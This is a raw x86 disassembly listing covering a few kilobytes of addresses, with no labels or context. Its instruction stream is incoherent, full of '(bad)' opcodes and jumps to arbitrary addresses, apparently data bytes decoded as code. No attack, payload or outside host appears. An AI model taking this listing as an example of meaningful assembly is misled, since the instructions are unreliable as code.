  409eee:	adc    eax,0x7ea363fa
  409ef3:	add    BYTE PTR [edi+0x10],dh
  409ef6:	jb     0x409f55
  409ef8:	push   esp
  409ef9:	dec    ecx
  409efa:	pop    ebp
  409efb:	dec    ecx
	...
  409f14:	add    BYTE PTR [esi+0x44],cl
  409f17:	jl     0x409f77
  409f19:	jns    0x409f5b
  409f1b:	push   ebx
  409f1c:	inc    ebx
  409f1d:	into   
  409f1e:	add    BYTE PTR [eax],al
  409f20:	add    BYTE PTR [ecx-0x62],ah
  409f23:	test   al,0xa1
  409f25:	ins    DWORD PTR es:[edi],dx
  409f26:	mov    bl,0xc0
  409f28:	retf   0xa95a
  409f2b:	mov    esi,0xa7c683a3
  409f30:	xchg   BYTE PTR [esi-0x66],bl
  409f33:	mov    ds:0x82824c9d,al
  409f38:	mov    al,ds:0x89989038
  409f3d:	jne    0x409ec9
  409f3f:	add    BYTE PTR [eax],al
  409f41:	cli    
  409f42:	ins    DWORD PTR es:[edi],dx
  409f43:	outs   dx,DWORD PTR ds:[esi]
  409f44:	push   0x10
  409f46:	inc    esi
  409f47:	jge    0x409fc2
  409f49:	in     eax,dx
  409f4a:	bound  edi,QWORD PTR [ebp+0x62]
  409f4d:	add    eax,0xf47c754e
  409f52:	addr16 jl 0x409f91
  409f55:	lea    eax,[ecx]
  409f57:	add    BYTE PTR [eax],al
  409f59:	push   es
  409f5a:	inc    edx
  409f5b:	inc    ebx
  409f5c:	pop    esi
  409f5d:	lods   al,BYTE PTR ds:[esi]
  409f5e:	jp     0x409fa9
  409f60:	dec    ebp
  409f61:	inc    ecx
  409f62:	dec    edi
  409f63:	dec    ecx
  409f64:	push   esi
  409f65:	dec    ecx
  409f66:	bound  eax,QWORD PTR [ecx+0x48]
  409f69:	pop    eax
  409f6a:	pop    esp
  409f6b:	dec    eax
  409f6c:	add    BYTE PTR [ecx+0x33],ah
  409f6f:	lsl    ebx,WORD PTR [ebp+0x1]
  409f73:	add    BYTE PTR [eax],al
  409f75:	jp     0x409f18
  409f77:	mov    dh,0xa0
	...
  409f91:	add    cl,ah
  409f93:	popf   
  409f94:	mov    dl,0xa5
  409f96:	scas   al,BYTE PTR es:[edi]
  409f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f99:	mov    edi,0xb89fb8a5
  409f9e:	hlt    
  409f9f:	retf   0xba5a
  409fa2:	jle    0x409f7a
  409fa4:	mov    BYTE PTR fs:[edi-0x6e],dh
  409fa8:	jle    0x409f3a
  409faa:	push   esp
  409fab:	ret    
  409fac:	jp     0x409f45
  409fae:	jo     0x409f88
  409fb0:	bound  ebp,QWORD PTR [ecx-0x5d972380]
  409fb6:	pop    ecx
  409fb7:	pop    edi
  409fb8:	pop    eax
  409fb9:	mov    ds:0x1c8e4a,al
  409fbe:	hlt    
  409fbf:	hlt    
  409fc0:	in     eax,0x32
  409fc2:	sar    DWORD PTR [edx-0x5d5cc1d],cl
  409fc8:	cdq    
  409fc9:	cmp    ch,BYTE PTR [ecx]
  409fcb:	add    ecx,edi
  409fcd:	dec    edx
  409fce:	pop    esp
  409fcf:	std    
  409fd0:	loop   0x40a002
  409fd2:	inc    ecx
  409fd3:	stc    
  409fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fd5:	es adc eax,0x585eb827
  409fdb:	inc    esp
  409fdc:	aad    0x2e
  409fde:	or     eax,0xbbffb11f
  409fe3:	push   ds
  409fe4:	add    eax,DWORD PTR [eax]
  409fe6:	hlt    
  409fe7:	sub    al,0xc9
  409fe9:	and    edx,esi
  409feb:	lock int 0xc
  409fee:	test   DWORD PTR ds:0x2b250e05,0xffff
	...
  40a00c:	add    BYTE PTR [eax],al
  40a00e:	add    BYTE PTR [edx],ch
  40a010:	add    eax,0x473e32d3
  40a015:	stc    
  40a016:	adc    DWORD PTR [ebx],edx
  40a018:	psubb  mm3,QWORD PTR [edi-0x1c]
  40a01c:	sbb    dh,dh
  40a01e:	inc    ebp
  40a01f:	or     ah,BYTE PTR [ebx+eax*1]
  40a022:	pusha  
  40a023:	fiadd  DWORD PTR [edx]
  40a025:	scas   eax,DWORD PTR es:[edi]
  40a026:	je     0x40a001
  40a028:	dec    ebp
  40a029:	xchg   ecx,eax
  40a02a:	and    BYTE PTR [esi],dl
  40a02c:	add    BYTE PTR [ecx-0x5afae7da],dl
  40a032:	nop
  40a033:	fcomp  DWORD PTR [ebx-0x50c6223]
  40a039:	xchg   edx,eax
  40a03a:	pop    DWORD PTR [edx+ebx*4]
  40a03d:	jge    0x409fd9
  40a03f:	cdq    
  40a040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a041:	mov    cl,0xcb
  40a043:	mov    edi,0xedc9abef
  40a048:	pop    es
  40a049:	fimul  WORD PTR [eax]
  40a04b:	mov    ch,0x8
  40a04d:	jmp    0xd8459455
  40a052:	adc    BYTE PTR [edi],cl
  40a054:	adc    eax,esp
  40a056:	push   esi
  40a057:	or     BYTE PTR [esp+ebx*8],ah
  40a05a:	adc    dh,ah
  40a05c:	add    al,0x1f
  40a05e:	mov    al,0x45
  40a060:	mov    ebx,0x546cb18
  40a065:	jecxz  0x40a073
  40a067:	std    
  40a068:	add    esp,ecx
  40a06a:	add    eax,0xefdf0af8
  40a06f:	add    edx,ebx
  40a071:	sub    cl,dh
	...
  40a08b:	add    BYTE PTR [esi],cl
  40a08d:	enter  0xc82f,0xf6
  40a091:	jmp    0xb7368c6
  40a096:	cs (bad) 
  40a098:	idiv   cl
  40a09a:	call   0x244594a2
  40a09f:	mov    edi,0xcc18c838
  40a0a4:	inc    esi
  40a0a5:	add    eax,0xecf803ae
  40a0aa:	add    BYTE PTR [eax],cl
  40a0ac:	sub    al,BYTE PTR ds:0x4fef701
  40a0b2:	ret    
  40a0b3:	mov    bl,0x21
  40a0b5:	mov    bh,0xb4
  40a0b7:	(bad)  
  40a0b8:	retf   0x9cec
  40a0bb:	mov    edx,0xb79aadc3
  40a0c0:	enter  0xfff4,0xa6
  40a0c4:	cdq    
  40a0c5:	add    BYTE PTR [eax-0x55],al
  40a0c8:	xchg   ebx,eax
  40a0c9:	mov    edi,0xfe80eb07
  40a0ce:	call   DWORD PTR [esi-0x38]
  40a0d1:	outs   dx,DWORD PTR ds:[esi]
  40a0d2:	lahf   
  40a0d3:	js     0x40a09c
  40a0d5:	cmp    al,BYTE PTR [ebx-0x7c8c108a]
  40a0db:	pusha  
  40a0dc:	scas   al,BYTE PTR es:[edi]
  40a0dd:	jg     0x40a06a
  40a0df:	fs mov bh,0x85
  40a0e2:	mov    WORD PTR [eax+0x68],fs
  40a0e5:	mov    ecx,DWORD PTR [ecx-0x608040a3]
  40a0eb:	mov    ch,0x76
  40a0ed:	mov    eax,DWORD PTR [ecx+0x94]
	...
  40a107:	add    BYTE PTR [eax],al
  40a109:	out    0x1b,al
  40a10b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a10c:	shl    edi,cl
  40a10e:	add    al,0x0
  40a110:	pop    ds
  40a111:	mov    al,ds:0x9f5066a7
  40a116:	loopne 0x40a192
  40a118:	dec    esi
  40a119:	xlat   BYTE PTR ds:[ebx]
  40a11a:	mov    al,ds:0xe8974c6b
  40a11f:	push   0x36
  40a121:	jb     0x40a0b2
  40a123:	jbe    0x40a10a
  40a125:	ins    DWORD PTR es:[edi],dx
  40a126:	xchg   ebp,eax
  40a127:	jo     0x40a140
  40a129:	pusha  
  40a12a:	cdq    
  40a12b:	pcmpgtb mm4,QWORD PTR gs:[ebp+edi*2+0x6b526]
  40a134:	xchg   ebx,eax
  40a135:	xor    edi,DWORD PTR [edx]
  40a137:	shl    DWORD PTR [edx-0x517bbbd4],0x2c
  40a13e:	dec    edx
  40a13f:	iret   
  40a140:	xchg   edx,eax
  40a141:	xor    eax,0x13cc380
  40a146:	inc    edi
  40a147:	shl    DWORD PTR [esp+edi*4],cl
  40a14a:	inc    edi
  40a14b:	sar    BYTE PTR [edi+esi*8+0x4],0x0
  40a150:	clc    
  40a151:	push   edi
  40a152:	aam    0x27
  40a154:	add    BYTE PTR [ebx+0x39],ch
  40a157:	arpl   WORD PTR [ebx+edi*8],sp
  40a15a:	sub    eax,0x36f7282c
  40a15f:	imul   ebp,DWORD PTR [eax],0xfffffff7
  40a162:	xor    ah,BYTE PTR ss:[edi+edi*1]
  40a166:	cmp    BYTE PTR [edi],ch
  40a168:	jnp    0x40a1b7
  40a16a:	push   es
	...
  40a183:	add    BYTE PTR [eax],al
  40a185:	add    ah,ah
  40a187:	into   
  40a188:	rcl    BYTE PTR [ebx+ebp*8-0x2a3a2227],0xd3
  40a190:	pushf  
  40a191:	rol    DWORD PTR [ebx],1
  40a193:	aad    0xd5
  40a195:	retf   0x7e03
  40a198:	add    BYTE PTR [eax],al
  40a19a:	xor    DWORD PTR [ecx],eax
  40a19c:	push   ds
  40a19d:	or     bh,bh
  40a19f:	push   cs
  40a1a0:	adc    bl,BYTE PTR [edi]
  40a1a2:	femms  
  40a1a4:	add    bl,BYTE PTR [esi]
  40a1a6:	stc    
  40a1a7:	cld    
  40a1a8:	adc    DWORD PTR [ebx+ecx*1],eax
  40a1ab:	prefetch BYTE PTR [edi]
  40a1ae:	fisttp WORD PTR [ebx]
  40a1b0:	or     DWORD PTR [eax],eax
  40a1b2:	cli    
  40a1b3:	sub    BYTE PTR [ebx+eiz*1],dh
  40a1b6:	aam    0x38
  40a1b8:	aaa    
  40a1b9:	xor    al,0xf4
  40a1bb:	xor    eax,0x2fd23527
  40a1c0:	cmp    BYTE PTR [edi],ch
  40a1c2:	shl    BYTE PTR [ecx],0x24
  40a1c5:	xor    eax,0x5cd
  40a1ca:	pop    edx
  40a1cb:	enter  0xc3d4,0x84
  40a1cf:	(bad)  
  40a1d0:	fcom   st(4)
  40a1d2:	jle    0x40a1b5
  40a1d4:	fcmovbe st,st(5)
  40a1d6:	jp     0x40a1a6
  40a1d8:	ror    ecx,1
  40a1da:	ins    BYTE PTR es:[edi],dx
  40a1db:	in     al,dx
  40a1dc:	mov    ah,0xcf
  40a1df:	or     BYTE PTR [eax],al
  40a1e1:	add    BYTE PTR [edi+eax*1+0x2f40d1b],al
  40a1e8:	cmc    
  40a1e9:	adc    al,0x0
	...
  40a203:	or     cl,BYTE PTR ds:0x31041700
  40a209:	in     eax,0x0
  40a20b:	or     ah,BYTE PTR [ebx+eax*1]
  40a20e:	add    ah,dh
  40a210:	aas    
  40a211:	mov    ds:0xa465d475,al
  40a216:	fs into 
  40a218:	popa   
  40a219:	test   al,0x74
  40a21b:	mov    esp,0xc17b926c
  40a220:	sbb    eax,DWORD PTR [ebx]
  40a222:	add    ah,dh
  40a224:	cvtpi2ps xmm7,mm6
  40a227:	sbb    al,0xdd
  40a229:	sub    al,0xed
  40a22b:	es loope 0x40a23f
  40a22e:	call   FWORD PTR [ecx]
  40a230:	adc    DWORD PTR [esi],edx
  40a232:	add    ah,dh
  40a234:	and    eax,DWORD PTR [esi]
  40a236:	sbb    bh,al
  40a238:	add    ebx,edi
  40a23a:	sbb    eax,0x27fe1cec
  40a23f:	lock psubb mm3,QWORD PTR [ebx]
  40a243:	clc    
  40a244:	and    eax,0xc5f40003
  40a249:	xchg   esi,eax
  40a24a:	imul   esp,DWORD PTR [eax-0x8],0xcd5c6daa
  40a251:	mov    ss,WORD PTR [edi+0x55]
  40a254:	retf   0xff8f
  40a257:	retf   
  40a258:	pop    esp
  40a259:	inc    eax
  40a25a:	sar    BYTE PTR [edx-0x6421cb7e],1
  40a260:	push   edx
  40a261:	cs fadd st,st(3)
  40a264:	mov    cl,BYTE PTR [ebx-0x24]
	...
  40a27f:	add    cl,al
  40a281:	push   esi
  40a282:	xor    eax,eax
  40a284:	hlt    
  40a285:	std    
  40a286:	sahf   
  40a287:	jno    0x40a299
  40a289:	call   0x18521e20
  40a28e:	nop
  40a28f:	jns    0x40a2aa
  40a291:	add    eax,0x9f0196af
  40a296:	call   0x3245969e
  40a29b:	aaa    
  40a29c:	cmp    eax,0x44455430
  40a2a1:	inc    ecx
  40a2a2:	sub    al,0x31
  40a2a4:	inc    esp
  40a2a5:	inc    ebp
  40a2a6:	jmp    0xa74596ae
  40a2ab:	int3   
  40a2ac:	scas   eax,DWORD PTR es:[edi]
  40a2ad:	mov    edx,0xaba5b1c8
  40a2b2:	les    ebp,FWORD PTR [edi+0x614404aa]
  40a2b8:	and    DWORD PTR [esi+0x62],0x54
  40a2bc:	imul   edi,DWORD PTR [di],0xe963616a
  40a2c3:	add    esi,esp
  40a2c5:	add    al,0xe7
  40a2c7:	icebp  
  40a2c8:	fmul   DWORD PTR [ecx]
  40a2ca:	in     al,0xa
  40a2cc:	test   ah,0xdb
  40a2cf:	hlt    
  40a2d0:	cli    
  40a2d1:	cld    
  40a2d2:	(bad)  
  40a2d3:	cli    
  40a2d4:	out    dx,al
  40a2d5:	add    al,0x87
  40a2d7:	push   edx
  40a2d8:	pop    ecx
  40a2d9:	push   0xffffff84
  40a2db:	imul   edx,DWORD PTR [esi-0x65987f94],0x6c8e78
	...
  40a2fd:	stos   DWORD PTR es:[edi],eax
  40a2fe:	dec    esp
  40a2ff:	jle    0x40a362
  40a301:	mov    ds:0xf403e964,al
  40a306:	add    al,0x77
  40a308:	pop    edx
  40a309:	xchg   esi,eax
  40a30a:	jl     0x40a36d
  40a30c:	pop    edi
  40a30d:	call   0x524a:0x80515463
  40a314:	addr16 jns 0x40a365
  40a317:	inc    ebx
  40a318:	pusha  
  40a319:	push   eax
  40a31a:	pop    ebx
  40a31b:	dec    esp
  40a31c:	add    al,0xf4
  40a31e:	add    al,0xa1
  40a320:	xor    BYTE PTR [eax+0x3d9f0026],ch
  40a326:	cmp    eax,0x2ac392cd
  40a32b:	aam    0x3c
  40a32d:	xor    eax,0xb82ad11c
  40a332:	cmp    eax,0x4be2bcb
  40a337:	add    BYTE PTR [ebx-0x16],ah
  40a33a:	outs   dx,BYTE PTR ds:[esi]
  40a33b:	mov    ah,0x77
  40a33d:	jp     0x40a394
  40a33f:	popf   
  40a340:	fs ins BYTE PTR es:[edi],dx
  40a342:	adc    DWORD PTR [ebp+0x4f868],0xbb757f64
  40a34c:	push   0x72814e77
  40a351:	outs   dx,BYTE PTR ds:[esi]
  40a352:	add    al,0x0
  40a354:	jmp    0xfefd:0xf93cf7f8
  40a35b:	pop    es
  40a35c:	jecxz  0x40a389
  40a35e:	std    
  40a35f:	add    eax,0xe8
	...
  40a378:	add    BYTE PTR [eax],al
  40a37a:	test   DWORD PTR [eax+eax*1],0x974b8460
  40a381:	data16 ja 0x40a403
  40a384:	mov    es,WORD PTR [ebx+0x4a0004f7]
  40a38a:	bound  esi,QWORD PTR [ebx+edi*2+0x6e908c49]
  40a391:	inc    edx
  40a392:	xchg   BYTE PTR [esi+0x301ca7ff],ah
  40a398:	fstp   DWORD PTR [esi-0x5f10cee7]
  40a39e:	add    al,0x38
  40a3a0:	rcl    DWORD PTR [esi-0x7ffc6cf],1
  40a3a6:	ret    0x16f9
  40a3a9:	stc    
  40a3aa:	leave  
  40a3ab:	repnz push DWORD PTR [edx-0x6031c416]
  40a3b2:	xlat   BYTE PTR ds:[ebx]
  40a3b3:	push   0xffffffcd
  40a3b5:	add    BYTE PTR [eax+0x3dedbf9f],cl
  40a3bb:	mov    es,WORD PTR [ebx+eax*8-0x676478ed]
  40a3c2:	gs cmc 
  40a3c4:	mov    DWORD PTR [esi-0x2d732100],ebx
  40a3ca:	into   
  40a3cb:	aad    0xff
  40a3cd:	push   DWORD PTR [edi-0x54]
  40a3d0:	stos   BYTE PTR es:[edi],al
  40a3d1:	stos   BYTE PTR es:[edi],al
  40a3d2:	pop    ebp
  40a3d3:	add    al,BYTE PTR [eax]
  40a3d5:	add    ch,ch
  40a3d7:	das    
  40a3d8:	xor    DWORD PTR [esi*8+0x263936],esp
	...
  40a3f7:	mov    gs,WORD PTR [ebx]
  40a3f9:	cmp    ebx,DWORD PTR es:[ebp+0x2]
  40a3fd:	add    BYTE PTR [eax],al
  40a3ff:	not    BYTE PTR [edx]
  40a401:	imul   ebp,DWORD PTR [ebx+0x5e],0x28ffff21
  40a408:	or     dl,BYTE PTR [esi]
  40a40a:	pop    es
  40a40b:	sbb    eax,0xe7000002
  40a410:	ffree  st(7)
  40a412:	stos   BYTE PTR es:[edi],al
  40a413:	or     eax,0xfd000002
  40a418:	clc    
  40a419:	in     al,0xe0
  40a41b:	sbb    eax,0x82000002
  40a420:	enter  0xe2ee,0x3e
  40a424:	int    0xc0
  40a426:	(bad)  
  40a427:	stos   BYTE PTR es:[edi],al
  40a428:	fdiv   st(2),st
  40a42a:	(bad)  
  40a42b:	lods   eax,DWORD PTR ds:[esi]
  40a42c:	xlat   BYTE PTR ds:[ebx]
  40a42d:	fcomp  st(6)
  40a42f:	or     esi,0xffffffce
  40a432:	iret   
  40a433:	int    0x1
  40a435:	add    BYTE PTR [eax],al
  40a437:	jno    0x40a3be
  40a439:	lods   al,BYTE PTR ds:[esi]
  40a43a:	mov    ds:0x837b27,al
  40a43f:	or     DWORD PTR [esi],ebx
  40a441:	xor    edi,DWORD PTR [edx]
  40a443:	leave  
  40a444:	adc    bl,BYTE PTR [ebx]
  40a446:	sbb    esp,esi
  40a448:	and    eax,0x1c4406f5
  40a44d:	add    eax,DWORD PTR [eax]
  40a44f:	hlt    
  40a450:	fdivrp st(3),st
  40a452:	ds loopne 0x40a48d
  40a455:	add    eax,0xfd3fce16
  40a45a:	add    al,0x0
	...
  40a474:	clc    
  40a475:	sbb    eax,DWORD PTR [ebx]
  40a477:	add    ah,dh
  40a479:	push   eax
  40a47a:	add    eax,0xa0cd42d
  40a47f:	add    BYTE PTR [esi],al
  40a481:	and    al,BYTE PTR [ebx]
  40a483:	add    ah,dh
  40a485:	ins    DWORD PTR es:[edi],dx
  40a486:	in     al,dx
  40a487:	push   edx
  40a488:	(bad)  
  40a489:	cmp    eax,0x38fa07d0
  40a48e:	or     dl,BYTE PTR [ebx]
  40a490:	scas   al,BYTE PTR es:[edi]
  40a491:	pop    esi
  40a492:	(bad)  
  40a493:	adc    eax,0x5c027daa
  40a498:	out    dx,eax
  40a499:	jo     0x40a435
  40a49b:	daa    
  40a49c:	jmp    0x40a4b3
  40a49e:	add    ebx,DWORD PTR [edi]
  40a4a0:	add    eax,0xc04ef612
  40a4a5:	(bad)  
  40a4a6:	retf   
  40a4a7:	inc    edx
  40a4a8:	mov    ch,0x26
  40a4aa:	loop   0x40a4e9
  40a4ac:	fist   DWORD PTR [edi-0x20]
  40a4af:	xor    bl,al
  40a4b1:	cwde   
  40a4b2:	test   al,0x5f
  40a4b4:	ret    
  40a4b5:	ins    BYTE PTR es:[edi],dx
  40a4b6:	add    eax,DWORD PTR [eax]
  40a4b8:	hlt    
  40a4b9:	sub    BYTE PTR [ebp-0x65],bl
  40a4bc:	cmp    al,0x6e
  40a4be:	push   ebp
  40a4bf:	stos   DWORD PTR es:[edi],eax
  40a4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c1:	jp     0x40a4d7
  40a4c3:	mov    esp,0xec5375a6
  40a4c8:	jmp    0x40a4fb
  40a4ca:	dec    ebp
  40a4cb:	shr    BYTE PTR [edx+0x3d],0x63
  40a4cf:	scas   eax,DWORD PTR es:[edi]
  40a4d0:	call   0x4193:0xd2e20e82
	...
  40a4ef:	add    BYTE PTR [eax],al
  40a4f1:	hlt    
  40a4f2:	add    al,0xd0
  40a4f4:	(bad)  [edi]
  40a4f6:	faddp  st(7),st
  40a4f8:	int    0x4
  40a4fa:	jmp    0xd51b97f0
  40a4ff:	cli    
  40a500:	idiv   cl
  40a502:	hlt    
  40a503:	fucomip st,st(3)
  40a505:	fwait
  40a506:	or     al,0xeb
  40a508:	in     al,0xd5
  40a50a:	fstp   TBYTE PTR [edx-0x1c103b25]
  40a510:	(bad)  
  40a512:	fld1   
  40a514:	add    esi,esp
  40a516:	add    al,0x1
  40a518:	aad    0x17
  40a51a:	loop   0x40a534
  40a51c:	(bad)  [ecx]
  40a51e:	clc    
  40a51f:	push   cs
  40a520:	rcl    DWORD PTR [ebx],cl
  40a522:	loopne 0x40a521
  40a524:	fistp  WORD PTR [ebx+0xc]
  40a527:	out    0xcc,eax
  40a529:	adc    bl,dl
  40a52b:	repnz out 0x17,al
  40a52e:	xchg   ebx,eax
  40a52f:	rcl    esp,cl
  40a531:	adc    ah,cl
  40a533:	mov    ds:0xcbd3f9f4,eax
  40a538:	add    esi,esp
  40a53a:	add    al,0x61
  40a53c:	pop    edx
  40a53d:	addr16 dec ebp
  40a53f:	push   ebp
  40a540:	pusha  
  40a541:	dec    esi
  40a542:	or     eax,0x4d585a63
  40a547:	jmp    0xa845994f
  40a54c:	sti    
  40a54d:	mov    eax,ds:0xf403e905
  40a552:	add    al,0xaf
  40a554:	pop    ss
	...
  40a56d:	add    bh,bh
  40a56f:	es jmp 0x8d459978
  40a575:	xchg   BYTE PTR [esi-0x68c9887e],cl
  40a57b:	imul   ebx,DWORD PTR [ecx+0x7e],0xfffffff4
  40a57f:	add    al,0x19
  40a581:	lahf   
  40a582:	pop    edx
  40a583:	xchg   ecx,eax
  40a584:	(bad)  
  40a585:	cmp    BYTE PTR [ebp-0x52e99f6e],bl
  40a58b:	stos   DWORD PTR es:[edi],eax
  40a58c:	push   0x24
  40a58e:	xchg   edi,eax
  40a58f:	mov    DWORD PTR [edx+0x14],esp
  40a592:	pop    esi
  40a593:	mov    eax,0x94781746
  40a598:	jp     0x40a597
  40a59a:	jle    0x40a568
  40a59c:	push   ebx
  40a59d:	(bad)  
  40a59e:	jg     0x40a533
  40a5a0:	cmp    ecx,DWORD PTR [edi]
  40a5a2:	mov    ecx,0xf7e94bc3
  40a5a7:	add    al,0x0
  40a5a9:	test   BYTE PTR [ecx-0x35],0x52
  40a5ad:	mov    esi,0xd945bbb7
  40a5b2:	xchg   edi,eax
  40a5b3:	ret    0xb34b
  40a5b6:	cmp    eax,0x36bb43ac
  40a5bb:	popf   
  40a5bc:	pop    edi
  40a5bd:	mov    al,ds:0xb25bb1a4
  40a5c2:	xor    eax,0x879071e9
  40a5c7:	mov    cl,0xff
  40a5c9:	sub    dh,BYTE PTR [edi-0x7c430ba]
  40a5cf:	xor    eax,0x68df
	...
  40a5e8:	add    BYTE PTR [eax],al
  40a5ea:	add    ch,ch
  40a5ec:	add    edi,0x23
  40a5ef:	mov    ch,0x3a
  40a5f1:	iret   
  40a5f2:	sub    eax,0xe9c42bad
  40a5f7:	test   DWORD PTR [eax+eax*1],0x85688644
  40a5fe:	push   0x46cd8370
  40a603:	xchg   ecx,eax
  40a604:	je     0x40a599
  40a606:	push   0xffffff83
  40a608:	jae    0x40a60a
  40a60a:	mov    ebx,0xdff21e0e
  40a60f:	or     al,0x15
  40a611:	mov    edx,0xe42203b9
  40a616:	add    BYTE PTR [ecx+0x72b2dfe1],bl
  40a61c:	out    dx,eax
  40a61d:	jmp    0x40a606
  40a61f:	test   bh,ah
  40a621:	in     eax,dx
  40a622:	in     al,0x7c
  40a624:	in     eax,dx
  40a625:	(bad)  
  40a626:	call   DWORD PTR [edx+0x5ecfc3c6]
  40a62c:	fcomp  st(4)
  40a62e:	(bad)  
  40a62f:	jo     0x40a5f7
  40a631:	retf   0x19cf
  40a634:	in     eax,dx
  40a635:	ret    0x7cc4
  40a638:	iret   
  40a639:	rcr    dh,cl
  40a63b:	outs   dx,DWORD PTR ds:[esi]
  40a63c:	iret   
  40a63d:	int3   
  40a63e:	add    BYTE PTR [esi],ch
  40a640:	mov    eax,0x8fd3bcb4
  40a645:	mov    bl,0xb5
  40a647:	popa   
  40a648:	mov    eax,0xb274aeae
  40a64d:	mov    bl,0xb5
	...
  40a667:	add    BYTE PTR [esi-0x5e],bh
  40a66a:	scas   eax,DWORD PTR es:[edi]
  40a66b:	lods   al,BYTE PTR ds:[esi]
  40a66c:	loopne 0x40a618
  40a66e:	out    dx,al
  40a66f:	test   BYTE PTR [esi-0x5c],ch
  40a672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a673:	mov    eax,ds:0xbbaba4c6
  40a678:	scas   al,BYTE PTR es:[edi]
  40a679:	add    DWORD PTR [edi-0x52841552],0x9798d2de
  40a683:	(bad)  
  40a684:	mov    dl,0x8d
  40a686:	mov    al,BYTE PTR [eax]
  40a688:	icebp  
  40a689:	out    dx,eax
  40a68a:	out    dx,al
  40a68b:	add    BYTE PTR [eax+0x53],ah
  40a68e:	pop    ebp
  40a68f:	pop    edi
  40a690:	push   ebp
  40a691:	cs (bad) 
  40a693:	jmp    DWORD PTR [eax+0x70]
  40a696:	jne    0x40a715
  40a698:	mov    WORD PTR [ebp+0x6e],gs
  40a69b:	cmp    eax,0x657d7a5c
  40a6a0:	call   0x5:0xdd665f6c
  40a6a7:	add    ah,dh
  40a6a9:	dec    edx
  40a6ab:	cmp    ch,BYTE PTR [ebx]
  40a6ad:	sub    ebp,edx
  40a6af:	adc    dh,ah
  40a6b1:	in     al,dx
  40a6b2:	mov    edi,0xc5ed2945
  40a6b7:	push   ebp
  40a6b8:	xor    al,0xea
  40a6ba:	lds    esp,FWORD PTR [eax+0x4e]
  40a6bd:	fsub   DWORD PTR [ebx-0x5917a982]
  40a6c3:	dec    ebx
  40a6c4:	cmp    dl,bl
  40a6c6:	mov    eax,0xb6ca4547
  40a6cb:	inc    edi
	...
  40a6e4:	add    BYTE PTR [esi+eax*1],bl
  40a6e7:	xchg   edi,eax
  40a6e8:	call   FWORD PTR [ebx+0x5ca366a3]
  40a6ee:	mov    edi,0x999cba50
  40a6f3:	popa   
  40a6f4:	mov    eax,ds:0xb254c14a
  40a6f9:	xchg   esp,eax
  40a6fa:	adc    BYTE PTR [ebp-0x4e],0xab
  40a6fe:	sbb    eax,DWORD PTR [ebx]
  40a700:	add    ah,dh
  40a702:	adc    eax,0x53c040ee
  40a707:	add    eax,DWORD PTR [eax]
  40a709:	hlt    
  40a70a:	outs   dx,DWORD PTR ds:[esi]
  40a70b:	addr16 test eax,0xa04f818e
  40a711:	cwde   
  40a712:	xchg   esi,eax
  40a713:	gs mov dl,0x53
  40a716:	and    BYTE PTR [esi-0x5a],0xf4
  40a71a:	mov    edx,0x9c8f8b79
  40a71f:	or     DWORD PTR [ecx-0x437e5983],0x9785a55b
  40a729:	imul   esp,ebp,0xa26c945a
  40a72f:	imul   ecx,DWORD PTR [esi-0x48a05e0c],0xaf45c8f4
  40a739:	dec    esi
  40a73a:	add    al,0xde
  40a73c:	or     ecx,ebp
  40a73e:	add    eax,0x8d68a333
  40a743:	pop    edx
  40a744:	add    al,0xf4
  40a746:	add    al,0x72
  40a748:	add    BYTE PTR [bx+si],al
	...
  40a75f:	add    BYTE PTR [eax],al
  40a761:	add    BYTE PTR [edi+ebx*2+0x24925f8f],dl
  40a768:	ins    BYTE PTR es:[edi],dx
  40a769:	pop    edx
  40a76a:	xchg   BYTE PTR [ebx+0x7b],ah
  40a76d:	pop    esi
  40a76e:	fwait
  40a76f:	push   eax
  40a770:	lods   eax,DWORD PTR ds:[esi]
  40a771:	imul   edx,DWORD PTR [edx+0x5c555d58],0x47
  40a778:	inc    edi
  40a779:	cpuid  
  40a77b:	push   ecx
  40a77c:	push   esi
  40a77d:	dec    ebp
  40a77e:	pop    ebp
  40a77f:	dec    ebx
  40a780:	pusha  
  40a781:	ins    DWORD PTR es:[edi],dx
  40a782:	shl    BYTE PTR [edx],0xb4
  40a785:	dec    ecx
  40a786:	hlt    
  40a787:	add    al,0xfd
  40a789:	ficom  DWORD PTR [ecx]
  40a78b:	mov    dh,al
  40a78d:	mov    ch,0x83
  40a78f:	or     BYTE PTR [edx+0x6c676e4b],cl
  40a795:	xor    eax,0x197b3c43
  40a79a:	hlt    
  40a79b:	add    al,0xd8
  40a79d:	xchg   esi,eax
  40a79e:	in     eax,0x8a
  40a7a0:	call   0x35459ba8
  40a7a5:	cmp    eax,DWORD PTR [ebx+0x3d]
  40a7a8:	jmp    0xba459bb0
  40a7ad:	mov    ebp,0xc799afb7
  40a7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7b3:	ret    0xa79c
  40a7b6:	mov    dh,0xbc
  40a7b8:	mov    esi,0xbec4c8c1
  40a7bd:	enter  0xa091,0xab
  40a7c1:	stos   BYTE PTR es:[edi],al
  40a7c2:	lds    ebp,FWORD PTR [ebp+esi*4+0xb9]
	...
  40a7dd:	add    BYTE PTR [eax],al
  40a7df:	cdq    
  40a7e0:	mov    WORD PTR [edi-0x554042],gs
  40a7e6:	xchg   BYTE PTR [esp+esi*4+0x65],bl
  40a7ea:	ja     0x40a84d
  40a7ec:	xchg   edi,eax
  40a7ed:	addr16 dec edi
  40a7ef:	stos   DWORD PTR es:[edi],eax
  40a7f0:	ret    0x6164
  40a7f3:	mov    BYTE PTR [ebx-0x2a64a3a0],cl
  40a7f9:	aas    
  40a7fa:	pop    eax
  40a7fb:	xchg   edi,eax
  40a7fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7fd:	jge    0x40a83e
  40a7ff:	sbb    BYTE PTR [esi+eax*2+0x79976627],0xda
  40a807:	mov    dl,0xbe
  40a809:	adc    eax,0x4f7e9
  40a80e:	pop    edx
  40a80f:	and    esi,DWORD PTR [eax-0x6e]
  40a812:	add    DWORD PTR [edx+0x6e],0xffffff98
  40a816:	jp     0x40a840
  40a818:	push   0x4f7e988
  40a81d:	add    BYTE PTR [eax+eiz*8-0x395b3ece],cl
  40a824:	inc    edx
  40a825:	aam    0x8b
  40a827:	out    0x31,al
